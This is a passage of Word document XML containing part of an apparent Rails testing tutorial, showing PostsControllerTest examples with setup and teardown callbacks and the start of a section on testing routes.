              </w:rPr>
              <w:t>PostsControllerTest &lt; ActionController::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2388C8DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="518E2D1C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # called before every single test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="566563D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>setup</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AB2F7D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= posts(:one)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EDA74FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC68969" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7492853D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # called after every single test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="340E7E5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>teardown</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B123304" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # as we are re-initializing @post before every test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="743BDEA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # setting it to nil here is not essential but I hope</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37D930A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # you understand how you can use the teardown method</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="222BCF2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05B7FC1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E4FCDA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5691A02A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "should show post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BBA4818" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get :show, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @post.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="246C9C95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75BFCE20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A53A533" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55F56DDE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "should destroy post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4384BD68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_difference('Post.count', -1) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56631DDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      delete :destroy, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @post.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="337D9462" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B2390F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1743DCE7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_redirected_to posts_path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="217E457D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="043C8F66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2255FE5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6612ED01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Above, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is called before each test and so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is available for each of the tests. Rails implements </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>teardown</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Callbacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Which essentially means you need not only use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>teardown</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as methods in your tests. You could specify them by using:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1B3167" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="319"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a block</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514327CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="319"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a method (like in the earlier example)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185A5577" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="319"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a method name as a symbol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8D6AFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="319"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a lambda</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384DF43A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let’s see the earlier example by specifying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> callback by specifying a method name as a symbol:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0C59375F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="219F3521" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require '../test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73C60794" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F1DBBBE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostsControllerTest &lt; ActionController::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02B82EFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EEF2D8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # called before every single test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68B32FF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  setup :initialize_post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D4350D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A80766F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # called after every single test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D4C5A9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>teardown</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="453D0E27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5254D532" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B83AFA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25F5DD34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "should show post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6433D753" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get :show, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @post.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33D87746" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12649665" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37EA4BA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3264160A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "should update post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44AE3A1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    patch :update, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @post.id, :post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AF7C153" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_redirected_to post_path(assigns(:post))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DC06ABD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19CBA98E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35347EB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "should destroy post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39EDC297" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_difference('Post.count', -1) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="714EF6B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      delete :destroy, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @post.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D5BBED7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43B541C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BA86880" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_redirected_to posts_path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26BDB2BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="567EFE5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60F0F95E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="179B8536" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="445217F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize_post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C6E7D82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= posts(:one)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55D193BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641D4CEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="531CA0FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55ADFE18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>9 Testing Routes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF9BC9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Like everything else in your Rails application, it is recommended that you test your routes. An example test for a route in the default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> controller above should look like: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AC2F25E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DC550A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should route to post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35B35E3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_routing '/posts/1', { :controller</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
